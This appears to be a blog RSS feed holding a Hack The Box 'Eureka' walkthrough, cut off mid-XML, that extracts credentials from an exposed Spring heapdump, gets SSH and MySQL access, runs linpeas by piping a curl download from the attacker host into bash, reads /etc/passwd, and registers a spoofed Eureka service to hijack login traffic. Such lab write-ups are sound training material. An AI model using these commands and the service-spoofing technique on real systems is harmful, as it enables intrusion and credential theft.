<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Home | 0xseclab</title><link>http://localhost:1313/</link><atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml"/><description>Home</description><generator>Hugo Blox Builder (https://hugoblox.com)</generator><language>en-us</language><lastBuildDate>Tue, 24 Oct 2023 00:00:00 +0000</lastBuildDate><image><url>http://localhost:1313/media/icon_hu10549305016715957011.png</url><title>Home</title><link>http://localhost:1313/</link></image><item><title>Eureka</title><link>http://localhost:1313/blog/eureka-htb/</link><pubDate>Sun, 31 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/blog/eureka-htb/</guid><description>&lt;div style="text-align: center; font-size: 2em; font-weight: bold; color: MediumSpringGreen;">
EUREKA-HTB-LINUX
&lt;/div>
&lt;h2 id="1-nmap-scan">1. NMAP-SCAN:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo nmap -p- -sV -sC --open -oN nmap-eureka 10.10.11.66
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427163709-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="2-directory-scanning-via-dirsearch">2. DIRECTORY SCANNING VIA DIRSEARCH:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">dirsearch -u http://furni.htb/ -e php,html,txt -t &lt;span class="m">50&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427163933-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see a &lt;strong>/actuator/heapdump&lt;/strong>&lt;/p>
&lt;p>Lets dump it via visiting the url through browser&lt;/p>
&lt;p>&lt;code>http://furni.htb/actuator/heapdump&lt;/code>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427164714-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="3-analyzing-heapdump">3. ANALYZING HEAPDUMP:&lt;/h2>
&lt;p>First check the file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">file heapdump
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250427164714-2.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Its a HPROF file&lt;/p>
&lt;p>Lets analyze it via JDumpSpider command:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428115313-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>The above credentials we found can be used to access the ssh as oscar190 user&lt;/p>
&lt;p>username: &lt;em>oscar190&lt;/em>
password: &lt;em>0sc@r190_S0l!dP@sswd&lt;/em>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428115550-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>This time we found another credentials for accessing Eureka Server which is running on port 8761
But the credentials shows that the service has been accessed internally on a port 8082&lt;/p>
&lt;p>username: &lt;em>EurekaSrvr&lt;/em>
password: &lt;em>0scarPWDisTheB3st&lt;/em>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428121234-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We also find the same password of Oscar for Mysql service.&lt;/p>
&lt;p>username: &lt;em>oscar190&lt;/em>
password: &lt;em>0sc@r190_S0l!dP@sswd&lt;/em>&lt;/p>
&lt;h3 id="options">OPTIONS:&lt;/h3>
&lt;p>Instead of java Jdumpspider we could also used strings command but the output of this command is quite garbage and difficult to identify the password among them.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">strings heapdump.hprof &lt;span class="p">|&lt;/span> grep -i &lt;span class="s2">&amp;#34;password\|token\|secret\|key&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="4-ssh-access--mysql">4. SSH ACCESS &amp;amp; MYSQL:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo ssh oscar190@furni.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124317-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Lets access mysql:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mysql -u oscar190 -p
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124555-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Check the database and tables:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show databases
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124750-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">use Furni_WebApp_DB&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428124943-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">show tables
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428125020-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see users, lets check this table:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="k">select&lt;/span> * from users&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428125205-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>All hashes are &lt;strong>bcrypt&lt;/strong> (&lt;code>$2a$10$&lt;/code>), makes them bruetforce-resistant without serious GPU firepower.&lt;/p>
&lt;h3 id="internal-enumeration">INTERNAL ENUMERATION:&lt;/h3>
&lt;p>Lets run linpeas on it first:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl http://10.10.x.x:1234/linpeas.sh &lt;span class="p">|&lt;/span> bash
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150144-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see an internal ports running on 8081 and 8082&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150745-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Another interesting files that need to be checked manually.&lt;/p>
&lt;p>Lets enumerate manually now.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ll /home
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428150849-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /etc/passwd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151116-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We find another user &lt;em>miranda-wise&lt;/em>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /var/www -l
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151236-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Lets check those files we found via linpeas&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /var/www/web/cloud-gateway/src/main/resources/application.yaml
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428151631-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Same credentials we found earlier for accessing the Internal server Eureka which is on port 8761&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls /opt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152004-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>Interesting files but the user can&amp;rsquo;t access it since it gives permission denied on the &lt;em>scripts&lt;/em> directory. Something we can later on check after Privilege escalation.&lt;/p>
&lt;h2 id="5-eureka-port-8761">5. EUREKA PORT 8761:&lt;/h2>
&lt;p>Its time to access the Eureka server which is available on port 8761, We will use the credentials which we found for it earlier via heapdump.&lt;/p>
&lt;p>*http://10.10.11.66:8761/&lt;/p>
&lt;p>Username: &lt;strong>EurekaSrvr&lt;/strong>
Password: &lt;strong>0scarPWDisTheB3st&lt;/strong>&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152722-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428152809-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We do see the &lt;em>User-Management-Service&lt;/em>&lt;/p>
&lt;p>So what is happening here ?&lt;/p>
&lt;h3 id="eureka-purpose">&lt;strong>EUREKA PURPOSE:&lt;/strong>&lt;/h3>
&lt;p>&lt;strong>Eureka&amp;rsquo;s main purpose is &lt;em>service discovery&lt;/em>&lt;/strong>—it helps microservices &lt;strong>find and communicate&lt;/strong> with each other dynamically without hard-coded URLs.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>Service Registration&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>When a microservice (e.g., &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>) starts, it registers itself with Eureka, saying:&lt;br>
&lt;em>&amp;ldquo;Hey, I’m USER-MANAGEMENT-SERVICE, and I’m running at &lt;code>localhost:8081&lt;/code>.&amp;rdquo;&lt;/em>&lt;/li>
&lt;li>Eureka stores this information in its registry.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Service Discovery&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>If another service (e.g., &lt;code>APP-GATEWAY&lt;/code>) needs to call &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>, it asks Eureka:
&lt;em>&amp;ldquo;Where can I find USER-MANAGEMENT-SERVICE?&amp;rdquo;&lt;/em>&lt;/li>
&lt;li>Eureka replies:
&lt;em>&amp;ldquo;It’s at &lt;code>localhost:8081&lt;/code> and is UP.&amp;rdquo;&lt;/em>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Load Balancing (with Ribbon)&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>If multiple instances of a service (e.g., 3 copies of &lt;code>FURNI&lt;/code>) are registered, Eureka helps distribute requests across them.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Health Monitoring&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>Eureka periodically checks if registered services are alive (UP/DOWN status).&lt;/li>
&lt;li>If a service crashes (DOWN), Eureka removes it from the registry, preventing failed requests.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h3 id="why-eureka-is-needed">&lt;em>Why Eureka is Needed:&lt;/em>&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>Dynamic Scaling&lt;/strong>: In cloud environments, services may start/stop or scale up/down. Hardcoding IPs/ports would break the system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Resilience&lt;/strong>: If a service fails, Eureka ensures traffic is routed only to healthy instances.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Decoupling&lt;/strong>: Services don’t need to know each other’s locations upfront—they just ask Eureka.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="how-can-we-abuse-it-">&lt;em>How can we abuse it ?&lt;/em>&lt;/h3>
&lt;p>&lt;strong>Eureka Server Spoofing:&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>If an attacker deploys a fake Eureka server, microservices might register with it (due to misconfiguration). The attacker could then:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>Redirect traffic to malicious endpoints.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Log sensitive API requests/responses.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;div class="pagebreak">&lt;/div>
&lt;h2 id="the-attack-scenario">THE ATTACK SCENARIO&lt;/h2>
&lt;p>&lt;code>lb://USER-MANAGEMENT-SERVICE&lt;/code> makes it MITM vulnerable:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>How the Load Balancer Works&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>When &lt;code>APP-GATEWAY&lt;/code> routes a request to &lt;code>lb://USER-MANAGEMENT-SERVICE/login&lt;/code>, it:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Asks Eureka:&lt;em>&amp;ldquo;Give me the IP/port of &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>.&amp;rdquo;&lt;/em>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Eureka responds with the registered instance (e.g., &lt;code>localhost:8081&lt;/code>).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The gateway forwards the request &lt;strong>without validating the target&amp;rsquo;s identity&lt;/strong>.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>The MITM Attack Scenario&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>An attacker can &lt;strong>register a fake service&lt;/strong> with Eureka (e.g., malicious-host:8081).&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Eureka doesn’t authenticate services by default, so it accepts the fake registration.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Now, when&lt;code>APP-GATEWAY&lt;/code> asks Eureka for &lt;code>USER-MANAGEMENT-SERVICE&lt;/code>, it gets the &lt;strong>attacker’s IP&lt;/strong> instead of the real one.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>All&lt;code>/login&lt;/code> requests are transparently routed to the attacker’s server, which can:&lt;/p>
&lt;ul>
&lt;li>Steal credentials (MITM).&lt;/li>
&lt;li>Modify responses (e.g., inject malicious JavaScript).&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>Why This Happens&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>No TLS&lt;/strong>: If communication is over HTTP, the attacker can read/modify traffic.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>No Service Authentication&lt;/strong>: Eureka trusts any service that registers.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>&lt;code>lb://&lt;/code> Trusts Eureka Blindly&lt;/strong>: The load balancer assumes Eureka’s response is legitimate.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol>
&lt;h4 id="our-goal">OUR GOAL:&lt;/h4>
&lt;p>If we replace a real service (e.g., USER-MANAGEMENT-SERVICE) with our fake server, all traffic that would normally go to the real one will now go to us. Then the authentication traffic should become:&lt;/p>
&lt;p>&lt;code>Login Form → APP-GATEWAY → USER-MANAGEMENT-SERVICE (hijacked) → OUR SERVER&lt;/code>&lt;/p>
&lt;h2 id="6-dumping-xml-configuration-for-user-management-service">6. DUMPING XML CONFIGURATION FOR &lt;strong>USER-MANAGEMENT-SERVICE&lt;/strong>:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl -u &lt;span class="s1">&amp;#39;EurekaSrvr:0scarPWDisTheB3st&amp;#39;&lt;/span> &lt;span class="err">&amp;#39;&lt;/span>http://furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250428164043-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;h2 id="7-create-a-malicious-xml">7. CREATE A MALICIOUS XML:&lt;/h2>
&lt;p>With the retrieved config file, we can modify these fields in our &lt;em>mitm.xml&lt;/em>:&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;strong>FIELD&lt;/strong>&lt;/th>
&lt;th>&lt;strong>MODIFICATION&lt;/strong>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>&lt;code>&amp;lt;instanceId&amp;gt;&lt;/code>&lt;/td>
&lt;td>iam-the-mitm&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;hostName&amp;gt;&lt;/code>&lt;/td>
&lt;td>attacker-IP&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;ipAddr&amp;gt;&lt;/code>&lt;/td>
&lt;td>attacker-IP&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;port&amp;gt;&lt;/code>&lt;/td>
&lt;td>Listening port&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;homePageUrl&amp;gt;&lt;/code>&lt;/td>
&lt;td>http://attacker_ip:port&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;statusPageUrl&amp;gt;&lt;/code>&lt;/td>
&lt;td>http://attacker_ip:portactuator/info&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>&lt;code>&amp;lt;healthPageUrl&amp;gt;&lt;/code>&lt;/td>
&lt;td>http://attacker_ip:portactuator/health&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">mousepad mitm.xml
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;instance&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;instanceId&amp;gt;&lt;/span>iam-the-mitm&lt;span class="nt">&amp;lt;/instanceId&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;hostName&amp;gt;&lt;/span>10.10.16.91&lt;span class="nt">&amp;lt;/hostName&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;app&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/app&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;ipAddr&amp;gt;&lt;/span>10.10.16.91&lt;span class="nt">&amp;lt;/ipAddr&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;status&amp;gt;&lt;/span>UP&lt;span class="nt">&amp;lt;/status&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;overriddenstatus&amp;gt;&lt;/span>UNKNOWN&lt;span class="nt">&amp;lt;/overriddenstatus&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;port&lt;/span> &lt;span class="na">enabled=&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>8081&lt;span class="nt">&amp;lt;/port&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;securePort&lt;/span> &lt;span class="na">enabled=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>443&lt;span class="nt">&amp;lt;/securePort&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;countryId&amp;gt;&lt;/span>1&lt;span class="nt">&amp;lt;/countryId&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;dataCenterInfo&lt;/span> &lt;span class="na">class=&lt;/span>&lt;span class="s">&amp;#34;com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;name&amp;gt;&lt;/span>MyOwn&lt;span class="nt">&amp;lt;/name&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/dataCenterInfo&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;leaseInfo&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;renewalIntervalInSecs&amp;gt;&lt;/span>30&lt;span class="nt">&amp;lt;/renewalIntervalInSecs&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;durationInSecs&amp;gt;&lt;/span>90&lt;span class="nt">&amp;lt;/durationInSecs&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;registrationTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/registrationTimestamp&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastRenewalTimestamp&amp;gt;&lt;/span>1745839235815&lt;span class="nt">&amp;lt;/lastRenewalTimestamp&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;evictionTimestamp&amp;gt;&lt;/span>0&lt;span class="nt">&amp;lt;/evictionTimestamp&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;serviceUpTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/serviceUpTimestamp&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/leaseInfo&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;metadata&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;management.port&amp;gt;&lt;/span>8081&lt;span class="nt">&amp;lt;/management.port&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/metadata&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;homePageUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/&lt;span class="nt">&amp;lt;/homePageUrl&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;statusPageUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/actuator/info&lt;span class="nt">&amp;lt;/statusPageUrl&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;healthCheckUrl&amp;gt;&lt;/span>http://10.10.16.91:8081/actuator/health&lt;span class="nt">&amp;lt;/healthCheckUrl&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;vipAddress&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/vipAddress&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;secureVipAddress&amp;gt;&lt;/span>USER-MANAGEMENT-SERVICE&lt;span class="nt">&amp;lt;/secureVipAddress&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;isCoordinatingDiscoveryServer&amp;gt;&lt;/span>false&lt;span class="nt">&amp;lt;/isCoordinatingDiscoveryServer&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;lastUpdatedTimestamp&amp;gt;&lt;/span>1745833103746&lt;span class="nt">&amp;lt;/lastUpdatedTimestamp&amp;gt;&lt;/span>
